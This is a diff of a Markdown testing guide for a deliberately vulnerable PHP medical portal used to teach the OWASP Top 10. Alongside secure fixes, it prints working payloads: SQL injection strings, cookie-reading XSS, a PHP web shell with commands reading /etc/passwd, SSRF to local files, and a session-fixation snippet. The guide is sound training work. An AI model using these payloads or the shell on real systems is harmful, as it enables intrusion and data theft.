@@ -1,79 +1,107 @@
-
 # Testing Guide
 
-Step-by-step instructions for testing every OWASP vulnerability in the portal. Each section tells you exactly what to do, what you should see when it works, and what changes when you flip `SECURE_MODE = true`.
+Step-by-step instructions for testing every OWASP vulnerability in the portal. Each section explains why the vulnerability exists, how to exploit it, and how the fix works at the code level.
 
 All tests assume you're running on Arch Linux with Apache + MariaDB as described in `README.md`, and that you're starting with `SECURE_MODE = false` in `config.php`.
 
 > [!tip]
-> You don't need to restart `httpd` after changing configuration or code
+> You don't need to restart `httpd` after changing `config.php` or any PHP file. PHP reads them fresh on every request.
 
 ---
 
-## Before You Start
+# Before You Start
 
 1. Confirm the app is running at `http://localhost`.
 2. Confirm you can log in as `alice@demo.com` / `password123`.
 3. Keep `config.php` open in your editor - you'll toggle `SECURE_MODE` repeatedly.
-4. Use Firefox or Chromium. Keep DevTools open (F12 → Network + Console tabs).
+4. Use Firefox. Chromium has built-in XSS filtering that may interfere with the A03 XSS test.
 
 ---
 
-## A01 - Broken Access Control (IDOR)
+# A01 - Broken Access Control (IDOR)
 
 **File:** `patient/records.php`
 
-### Vulnerable
+## Why it's vulnerable
+
+The page takes a `patient_id` parameter from the URL and queries the database with it directly. There is no check to verify that the logged-in user is authorized to view that patient's data. Any authenticated user can view any patient's record by changing the ID in the URL.
+
+## Test (vulnerable)
 
 1. Log in as Alice (`alice@demo.com` / `password123`).
 2. Navigate to **My Records**. You see Alice's medical record.
-3. Look at the URL - it loads your own record by default.
-4. Change the URL to: `http://localhost/patient/records.php?patient_id=2`
-5. You now see **Bob's** full medical record (DOB, blood type, allergies, notes) without any authorization check.
+3. Change the URL to: `http://localhost/patient/records.php?patient_id=2`
+4. You now see Bob's full medical record - DOB, blood type, allergies, clinical notes - without any authorization check.
 
-### Secure
+## Test (secure)
 
 1. Set `SECURE_MODE = true` in `config.php`.
-2. Repeat step 4 above.
-3. You get a **403 Access Denied** response. The server checks that `$_SESSION['user_id']` matches the requested `patient_id`.
+2. Repeat step 3 above.
+3. You get a **403 Access Denied** response.
+
+## How the fix works
+
+The secure version casts the `patient_id` to an integer and compares it against `$_SESSION['user_id']`. If they don't match and the user isn't a doctor or admin, the request is rejected before any database query runs. This is an ownership check - the server enforces that you can only access your own data.
+
+```php
+if ((int)$id !== currentUserId() && currentRole() !== 'doctor' && currentRole() !== 'admin') {
+    http_response_code(403);
+    die('Access denied.');
+}
+```
+
+The query also uses a prepared statement instead of string concatenation, which fixes a secondary SQL injection vector.
 
 ---
 
-## A02 - Cryptographic Failures (MD5 Passwords)
+# A02 - Cryptographic Failures (MD5 Passwords)
 
 **File:** `auth/register.php`, `auth/login.php`
 
-### Vulnerable
+## Why it's vulnerable
+
+Passwords are hashed with MD5, which is a fast, unsalted hash originally designed for checksums - not password storage. MD5 hashes can be reversed via precomputed rainbow tables in seconds. Every identical password produces the same hash, making bulk cracking trivial.
+
+## Test (vulnerable)
 
 1. Open a MySQL shell:
    ```bash
-   mysql -u root -p medicare
+   mariadb -u root -p medicare
    ```
 2. Run:
    ```sql
    SELECT email, password FROM users;
    ```
-3. All passwords are stored as 32-character MD5 hashes. MD5 is trivially reversible via rainbow tables - paste any hash into an online MD5 lookup and the plaintext comes back instantly.
+3. All passwords are 32-character hex strings. Copy any one and paste it into an online MD5 reverse lookup - the plaintext comes back instantly.
 
-### Secure
+## Test (secure)
 
 1. Set `SECURE_MODE = true`.
-2. Register a new account through the UI at `/auth/register.php`.
-3. Check the database again:
+2. Register a new account at `/auth/register.php`.
+3. Query the database again:
    ```sql
    SELECT email, password FROM users ORDER BY id DESC LIMIT 1;
    ```
-4. The new account's password is a bcrypt hash (starts with `$2y$`), which is salted and computationally expensive to crack.
+4. The new password starts with `$2y$` - a bcrypt hash that is salted and computationally expensive to crack.
 
-**Note:** The seed accounts still have MD5 hashes. In secure mode, login uses `password_verify()` against bcrypt, so the seed accounts won't work unless you re-register them or manually update their hashes.
+> [!note]
+> The seed accounts still have MD5 hashes. In secure mode, login uses `password_verify()` against bcrypt, so the seed accounts won't work unless you re-register them or manually update their hashes.
+
+## How the fix works
+
+`password_hash($password, PASSWORD_BCRYPT)` generates a unique salt per password and runs the bcrypt algorithm with a configurable cost factor (default 10 = 1024 iterations). Even if two users have the same password, their hashes differ. Verification uses `password_verify()` which extracts the salt from the stored hash and recomputes - no raw comparison.
 
 ---
 
-## A03 - SQL Injection
+# A03 - SQL Injection
 
 **File:** `shared/search.php`
 
-### Vulnerable
+## Why it's vulnerable
+
+User input from the search bar is concatenated directly into the SQL query string. The database engine has no way to distinguish between data and SQL syntax, so an attacker can inject additional SQL clauses to change the query's logic.
+
+## Test (vulnerable)
 
 1. Log in as any user.
 2. Go to **Find a Doctor**.
@@ -82,150 +110,236 @@ All tests assume you're running on Arch Linux with Apache + MariaDB as described
    ' OR '1'='1
    ```
 4. Hit Search.
-5. The query becomes `SELECT * FROM users WHERE role='doctor' AND name LIKE '%' OR '1'='1%'` - which returns **every row** in the `users` table, including emails and MD5 password hashes.
+5. The constructed query becomes:
+   ```sql
+   SELECT * FROM users WHERE role='doctor' AND name LIKE '%' OR '1'='1%'
+   ```
+   The `OR '1'='1'` clause is always true, so the query returns every row in the `users` table - including emails, roles, and MD5 password hashes.
 
-You can also try more targeted payloads:
+You can also try:
 ```
 ' UNION SELECT 1,2,3,4,5,6 -- -
 ```
 
-### Secure
+## Test (secure)
 
 1. Set `SECURE_MODE = true`.
 2. Repeat the same injection.
-3. The search returns zero results. The input is bound as a parameter via PDO prepared statements, so the `'` is treated as a literal character. The secure query also only returns `id`, `name`, and `email` - no password hashes.
+3. The search returns zero results. The `'` is treated as a literal character, not SQL syntax.
+
+## How the fix works
+
+The secure version uses PDO prepared statements. The query structure is sent to the database first with a `?` placeholder, and the user input is bound separately as a parameter. The database engine knows the parameter is data, never SQL - so injection is structurally impossible regardless of the input content.
+
+```php
+$stmt = $conn->prepare("SELECT id, name, email FROM users WHERE role='doctor' AND name LIKE ?");
+$stmt->execute(["%$name%"]);
+```
+
+The secure query also returns only `id`, `name`, and `email` instead of `SELECT *`, which avoids leaking password hashes even if the query logic were somehow bypassed.
 
 ---
 
-## A03 - Cross-Site Scripting (XSS)
+# A03 - Cross-Site Scripting (XSS)
 
 **File:** `patient/chat.php`, `doctor/chat.php`
 
-### Vulnerable
+## Why it's vulnerable
+
+Message content from the database is rendered directly into the HTML with `<?= $msg['body'] ?>`. The browser interprets any HTML or JavaScript in the message body as markup, not text. An attacker can store a payload in the database that executes in every user's browser when they view the conversation.
+
+## Test (vulnerable)
 
 1. Log in as Alice (`alice@demo.com`).
-2. Go to **Messages**.
-3. Select Dr. Smith and send this message:
+2. Go to **Messages**, select Dr. Smith, and send:
    ```
-   <script>alert('XSS')</script>
+   <img src=x onerror="alert(document.cookie)">
    ```
-4. The page reloads and a JavaScript alert box pops up. The script tag was stored in the database and rendered as raw HTML.
-5. Now log in as Dr. Smith (`drsmith@demo.com` / `password123`), go to Messages, and click Alice. The alert fires again - this is **stored XSS** that hits every user who views the conversation.
+3. The page reloads and a JavaScript alert fires showing your session cookie.
+4. Log in as Dr. Smith (`drsmith@demo.com` / `password123`), go to Messages, click Alice - the alert fires again. This is **stored XSS**: the payload persists in the database and hits every user who views the conversation.
 
-You can also try:
+Other payloads to try:
 ```
-<img src=x onerror="alert(document.cookie)">
+<b onmouseover="alert('XSS')">hover me</b>
+<marquee onstart="alert('XSS')">test</marquee>
 ```
 
-### Secure
+## Test (secure)
 
 1. Set `SECURE_MODE = true`.
 2. Send the same payload.
-3. The message renders as visible text: `<script>alert('XSS')</script>`. The `htmlspecialchars()` function escapes `<` and `>` so the browser treats it as text, not markup.
+3. The message renders as visible text. You can read `<img src=x onerror="alert(document.cookie)">` as a string in the chat bubble - it doesn't execute.
+
+## How the fix works
+
+`htmlspecialchars($value, ENT_QUOTES, 'UTF-8')` converts `<` to `&lt;`, `>` to `&gt;`, `"` to `&quot;`, and `'` to `&#039;`. The browser renders these as visible characters instead of parsing them as HTML tags or JavaScript event handlers.
+
+```php
+// Vulnerable: raw output
+<p><?= $msg['body'] ?></p>
+
+// Secure: escaped output
+<p><?= htmlspecialchars($msg['body'], ENT_QUOTES, 'UTF-8') ?></p>
+```
 
 ---
 
-## A04 - Insecure Design
+# A04 - Insecure Design
 
 **File:** `patient/appointments.php`
 
-### Vulnerable
+## Why it's vulnerable
 
-1. Log in as Alice.
-2. Go to **Appointments**.
-3. Book the same time slot repeatedly - there's no conflict check. You can book 50 appointments on the same date.
-4. You can also book any doctor at any time, even times that are already taken.
+The booking form has no server-side validation beyond checking that the fields aren't empty. There is no check for conflicting time slots, no limit on how many appointments a patient can book per day, and no verification that the doctor is available. This is a design flaw, not a coding bug - the validation logic was never implemented.
 
-### Secure
+## Test (vulnerable)
+
+1. Log in as Alice. Go to **Appointments**.
+2. Book the same doctor, date, and time slot repeatedly - it accepts every one. You can create 50 duplicate appointments.
+3. There is no business logic preventing overbooking.
+
+## Test (secure)
 
 1. Set `SECURE_MODE = true`.
-2. Try to book a slot that already exists - you get: "That time slot is already taken."
-3. Try to book more than 3 appointments on the same day - you get: "You cannot book more than 3 appointments per day."
+2. Book an appointment, then try to book the same slot again - you get: "That time slot is already taken."
+3. Book 3 appointments on the same day, then try a 4th - you get: "You cannot book more than 3 appointments per day."
+
+## How the fix works
+
+Two server-side checks run before the insert:
+
+```php
+// 1. Check if the slot is already taken
+SELECT COUNT(*) FROM appointments WHERE doctor_id = ? AND datetime = ? AND status = 'scheduled'
+
+// 2. Check daily booking limit
+SELECT COUNT(*) FROM appointments WHERE patient_id = ? AND DATE(datetime) = DATE(?) AND status = 'scheduled'
+```
+
+Both use prepared statements and return early with an error message if the constraint is violated. The insert only proceeds if both pass.
 
 ---
 
-## A05 - Security Misconfiguration
+# A05 - Security Misconfiguration
 
 **Files:** `.htaccess`, Apache config, PHP error handling
 
-### Vulnerable
+## Why it's vulnerable
 
-1. With `SECURE_MODE = false`, trigger a database error. The easiest way: temporarily change `DB_NAME` in `config.php` to a database that doesn't exist, then load any page.
-2. You'll see a full PDO exception with the database name, host, and stack trace displayed to the user.
-3. Navigate to `http://localhost/db/` - if `Options -Indexes` isn't working, you'll see directory listings exposing `schema.sql`.
+In vulnerable mode, PHP exceptions bubble up to the browser with full stack traces, database connection details, and internal file paths. This gives an attacker detailed information about the server's internals - database name, table structure, PHP version, file system layout - which helps them craft targeted attacks.
 
-### Secure
+## Test (vulnerable)
 
-1. Set `SECURE_MODE = true` and trigger the same error.
-2. The user sees a generic "An error occurred" message. No stack trace, no database details.
-3. In a production setup, you'd also set `display_errors = Off` in `php.ini` and restrict directory access via `.htaccess`.
+1. With `SECURE_MODE = false`, temporarily change `DB_NAME` in `config.php` to something that doesn't exist (e.g. `medicare_typo`).
+2. Load any page.
+3. You'll see a full PDO exception on screen: `SQLSTATE[HY000] [1049] Unknown database 'medicare_typo'` with the file path and line number.
+4. Restore `DB_NAME` to `medicare` when done.
+
+## Test (secure)
+
+1. Set `SECURE_MODE = true` and repeat the same steps.
+2. The user sees a generic "An error occurred. Please try again." message. No stack trace, no database name, no file paths.
+
+## How the fix works
+
+The `renderError()` function in `config.php` checks `SECURE_MODE`. In secure mode, it displays a generic error message regardless of the actual exception. In a production environment, you'd also set `display_errors = Off` in `/etc/php/php.ini` and log errors to a file instead of displaying them.
 
 ---
 
-## A06 - Vulnerable Components
+# A06 - Vulnerable Components
 
 **File:** `composer.json`
 
-This one is a reference demo, not a runtime exploit.
+This is a reference demo, not a runtime exploit.
 
-1. Open `composer.json` and note the dependency:
-   ```json
-   "phpmailer/phpmailer": "5.2.23"
-   ```
-2. This version has **CVE-2016-10033** (remote code execution via mail header injection).
-3. If you've installed Composer, run:
+## Why it's vulnerable
+
+The project declares a dependency on `phpmailer/phpmailer` version `5.2.23`, which has **CVE-2016-10033** - a remote code execution vulnerability via mail header injection. Using outdated dependencies with known CVEs is one of the most common attack vectors in real applications.
+
+## Test
+
+1. Install Composer if you don't have it:
    ```bash
+   sudo pacman -S composer
+   ```
+2. Run:
+   ```bash
+   cd /path/to/medicare-portal
    composer install
    composer audit
    ```
-4. The audit will flag the known vulnerability.
-5. The fix: update to PHPMailer 6.x+ and verify with `composer audit` showing zero advisories.
+3. The audit output flags the known vulnerability with a severity level and CVE link.
+
+## How the fix works
+
+Update the dependency to a patched version (`6.x+`), run `composer audit` again, and confirm zero advisories. In practice, you'd also use `composer outdated` regularly and integrate dependency scanning into CI/CD.
 
 ---
 
-## A07 - Authentication & Session Failures
+# A07 - Authentication & Session Failures
 
 **File:** `auth/login.php`
 
-### Vulnerable
+## Why it's vulnerable
+
+When a user logs in, the server sets session variables but does not regenerate the session ID. This means the session ID from *before* login is still valid *after* login. An attacker who knows (or sets) the pre-login session ID can hijack the authenticated session - this is called **session fixation**.
+
+## Test (vulnerable)
 
 1. Open DevTools → Application → Cookies.
 2. Note the `PHPSESSID` cookie value.
 3. Log in as Alice.
-4. Check the cookie again - **the session ID is the same**. It was not regenerated on login, making session fixation attacks possible.
+4. Check the cookie again - **it's the same value**. The session ID was not regenerated.
 
 To demonstrate fixation:
 1. Visit the login page. Copy your `PHPSESSID`.
-2. In a second browser/incognito window, manually set a cookie: `PHPSESSID=<copied_value>`.
-3. Go back to the first browser and log in.
-4. Refresh the second browser - you're now logged in as Alice using the pre-set session ID.
+2. In a second browser (or incognito window), open DevTools → Console and run:
+   ```javascript
+   document.cookie = "PHPSESSID=<paste_value_here>; path=/";
+   ```
+3. Go back to the first browser and log in as Alice.
+4. Refresh the second browser at `http://localhost/patient/dashboard.php` - you're logged in as Alice without ever entering credentials.
 
-### Secure
+## Test (secure)
 
 1. Set `SECURE_MODE = true`.
 2. Note the `PHPSESSID` before login.
 3. Log in.
-4. The session ID changes - `session_regenerate_id(true)` was called, which invalidates the old session and issues a new ID. The fixation attack no longer works.
+4. The session ID changes. The old ID is invalidated. The fixation attack no longer works.
+
+## How the fix works
+
+`session_regenerate_id(true)` creates a new session ID and **destroys** the old session file. The `true` parameter is important - without it, the old session data remains accessible. A login timestamp is also stored to enable session expiration checks.
+
+```php
+session_regenerate_id(true);
+$_SESSION['user_id'] = $user['id'];
+$_SESSION['login_time'] = time();
+```
 
 ---
 
-## A08 - Unrestricted File Upload (Webshell)
+# A08 - Unrestricted File Upload (Webshell)
 
 **File:** `shared/upload.php`
 
-### Vulnerable
+## Why it's vulnerable
 
-1. Create a test PHP file on your machine:
+The upload handler calls `move_uploaded_file()` using the original filename with no validation. Since Apache is configured to execute `.php` files, uploading a PHP script to the `/uploads/` directory creates a web-accessible endpoint that runs arbitrary code on the server.
+
+## Test (vulnerable)
+
+1. Create a test file:
    ```bash
    echo '<?php echo shell_exec($_GET["cmd"]); ?>' > /tmp/shell.php
    ```
 2. Log in as any user. Go to **Upload File**.
 3. Upload `shell.php`.
-4. After upload, the page shows a link to the file. Click it, or navigate directly to:
+4. Navigate to:
    ```
    http://localhost/uploads/shell.php?cmd=whoami
    ```
-5. You see the output of `whoami` - the PHP file executed on the server. You now have arbitrary command execution.
+5. You see the output of `whoami`. You have arbitrary command execution on the server.
 
 Try other commands:
 ```
@@ -233,80 +347,130 @@ http://localhost/uploads/shell.php?cmd=cat /etc/passwd
 http://localhost/uploads/shell.php?cmd=ls -la /
 ```
 
-### Secure
+## Test (secure)
 
 1. Set `SECURE_MODE = true`.
 2. Try uploading `shell.php` again.
 3. You get: "Invalid file type. Only PDF, JPEG, and PNG are allowed."
-4. The server checks the actual MIME type using `finfo`, not just the file extension. Even if you rename `shell.php` to `shell.pdf`, the MIME check catches it.
-5. Valid uploads get renamed to a random hex string with the correct extension, preventing execution.
+4. Even renaming `shell.php` to `shell.pdf` fails - the server checks the actual MIME type of the file content, not the extension.
+
+## How the fix works
+
+Three layers of defense:
+
+1. **MIME type validation** - `finfo_file()` reads the file's magic bytes to determine the real content type, regardless of extension. Only `application/pdf`, `image/jpeg`, and `image/png` are allowed.
+2. **Filename randomization** - the file is saved as a random 32-character hex string with the correct extension (`.pdf`, `.jpg`, `.png`), making it impossible to predict or request by name.
+3. **Storage location** - in a production setup, uploads would be stored outside the webroot so Apache can't serve them directly. The uploaded file path would be served through a PHP handler that checks permissions.
+
+```php
+$finfo = finfo_open(FILEINFO_MIME_TYPE);
+$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
+if (!in_array($mime, ['application/pdf', 'image/jpeg', 'image/png'], true)) {
+    die('Invalid file type.');
+}
+$safeName = bin2hex(random_bytes(16)) . $ext;
+```
 
 ---
 
-## A09 - Logging & Monitoring Failures
+# A09 - Logging & Monitoring Failures
 
 **File:** `admin/audit_log.php`
 
-### Vulnerable
+## Why it's vulnerable
+
+In vulnerable mode, `writeAuditLog()` returns immediately without writing anything. Sensitive actions - logins, record access, file uploads, searches, messages - happen silently. If the system is compromised, there is no trail to investigate what happened, when, or by whom.
+
+## Test (vulnerable)
 
 1. Log in as Admin (`admin@demo.com` / `admin123`).
-2. Go to **Audit Log**.
-3. The table is empty. Perform several actions: log in/out, view patient records, upload files, search doctors.
-4. Check the audit log again - still empty. No actions are being recorded.
+2. Go to **Audit Log**. The table is empty.
+3. Perform several actions: log out, log back in, view patient records, upload files, search doctors.
+4. Check the audit log again - still empty.
 
-### Secure
+## Test (secure)
 
 1. Set `SECURE_MODE = true`.
-2. Log out and log back in as Admin.
-3. Perform the same actions.
-4. Go to the Audit Log - every login, record access, search, upload, and message is now recorded with the user, action, IP address, and timestamp.
+2. Reset the database (`mariadb -u root -p < db/schema.sql`) to clear any stale data.
+3. Log in as Admin and repeat the same actions.
+4. Go to the Audit Log - every action is recorded with user, action description, IP address, and timestamp.
+
+## How the fix works
+
+In secure mode, `writeAuditLog()` inserts a row into the `audit_log` table via a prepared statement. It's called at every security-relevant point: login, logout, record access, search, upload, message send, user deletion, and appointment booking.
+
+```php
+function writeAuditLog(string $action): void {
+    if (!SECURE_MODE) {
+        return; // <-- the vulnerability: this line skips all logging
+    }
+    $conn = getDB();
+    $stmt = $conn->prepare("INSERT INTO audit_log (user_id, action, ip) VALUES (?, ?, ?)");
+    $stmt->execute([$_SESSION['user_id'] ?? null, $action, $_SERVER['REMOTE_ADDR'] ?? '']);
+}
+```
 
 ---
 
-## A10 - Server-Side Request Forgery (SSRF)
+# A10 - Server-Side Request Forgery (SSRF)
 
 **File:** `shared/insurance_fetch.php`
 
-### Vulnerable
+## Why it's vulnerable
 
-1. Log in as any user. Go to **Insurance Verification** (via the sidebar under "Upload File" isn't it - look for the URL directly: `http://localhost/shared/insurance_fetch.php`).
-2. In the URL field, enter:
+The page takes a URL from user input and passes it directly to `file_get_contents()`. This PHP function follows the URL from the server's perspective, which means the attacker can make the server fetch internal resources that are not accessible from outside - localhost services, cloud metadata endpoints, or local files via `file://`.
+
+## Test (vulnerable)
+
+1. Log in as any user. Go to **Insurance Verification** in the sidebar.
+2. Enter this URL:
    ```
    http://localhost/config.php
    ```
-3. Hit Fetch. The server reads `config.php` via `file_get_contents()` and dumps the full source code - including database credentials - into the response.
+3. Hit Fetch. The response shows the full source code of `config.php`, including database credentials.
 4. Try:
    ```
    file:///etc/passwd
    ```
-5. You get the contents of `/etc/passwd`. The server can be used as a proxy to reach internal services and read local files.
+5. You get the contents of the system password file. The server is acting as an open proxy.
 
-### Secure
+## Test (secure)
 
 1. Set `SECURE_MODE = true`.
 2. Try the same URLs.
 3. You get: "URL not permitted. Only approved insurance provider domains are allowed."
-4. Even if you somehow match the domain whitelist, the server checks the resolved IP against private ranges (`127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) and blocks them.
 
----
+## How the fix works
 
-## Quick Test Cycle
+Two layers of validation:
 
-For rapid demo iterations:
+1. **Domain whitelist** - only URLs starting with approved insurance provider domains are allowed. Everything else is rejected before any request is made.
+2. **Private IP blocking** - even if a whitelisted domain resolves to a private IP (DNS rebinding attack), the server resolves the hostname and checks the IP against RFC 1918 ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) and loopback (`127.0.0.0/8`). Private IPs are blocked.
 
-```bash
-# Edit SECURE_MODE
-nano /path/to/medicare-portal/config.php
-
-# Reset the database (wipes all data, re-seeds accounts)
-mysql -u root -p < /path/to/medicare-portal/db/schema.sql
+```php
+$parsed = parse_url($url);
+$ip = gethostbyname($parsed['host'] ?? '');
+if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
+    die('Resolved IP is in a private range. Request blocked.');
+}
 ```
 
-No server restart needed after changing `config.php` - PHP reads it fresh on every request.
+---
+
+# Quick Test Cycle
+
+For rapid demo iterations:
+```bash
+# Toggle SECURE_MODE
+vim /path/to/medicare-portal/config.php
+
+# Reset the database (wipes all data, re-seeds accounts)
+mariadb -u root -p < /path/to/medicare-portal/db/schema.sql
+```
 
 ---
 
-## Troubleshooting
+# Troubleshooting
 
 **"Connection refused" or blank page:**
 - Check Apache is running: `sudo systemctl status httpd`
@@ -315,17 +479,18 @@ No server restart needed after changing `config.php` - PHP reads it fresh on eve
 
 **"Access denied" from MySQL:**
 - Verify credentials in `config.php` match what you set during `mariadb-secure-installation`
-- Test manually: `mysql -u root -p medicare -e "SELECT 1"`
+- Test manually: `mariadb -u root -p medicare -e "SELECT 1"`
 
 **Uploads don't execute (A08 test fails):**
-- You must use Apache, not `php -S`. The built-in PHP server doesn't execute uploaded `.php` files from the uploads directory the same way.
-- Check that `uploads/.htaccess` is **not** blocking PHP execution (in vulnerable mode, it shouldn't be).
+- You must use Apache, not `php -S`. The built-in PHP server doesn't execute uploaded `.php` files from the uploads directory.
+- Check that `uploads/.htaccess` is not blocking PHP execution (in vulnerable mode, it shouldn't be).
 
 **Session fixation test (A07) not working:**
-- Make sure you're using two separate browser profiles or one regular + one incognito window. Tabs in the same browser share the same cookie jar.
+- Use two separate browser profiles or one regular + one incognito window. Tabs in the same browser share the same cookie jar.
 
-**XSS alert doesn't fire:**
-- If you're using a browser with built-in XSS protection (some Chromium builds), try Firefox instead - it doesn't filter reflected/stored XSS by default.
+**XSS payload doesn't fire:**
+- Use Firefox. Some Chromium builds have built-in XSS auditors that silently block script execution.
 - Verify `SECURE_MODE = false` in `config.php`.
+- If `<script>alert('XSS')</script>` doesn't work, use `<img src=x onerror="alert(document.cookie)">` instead - it bypasses more browser protections.
 
 ---
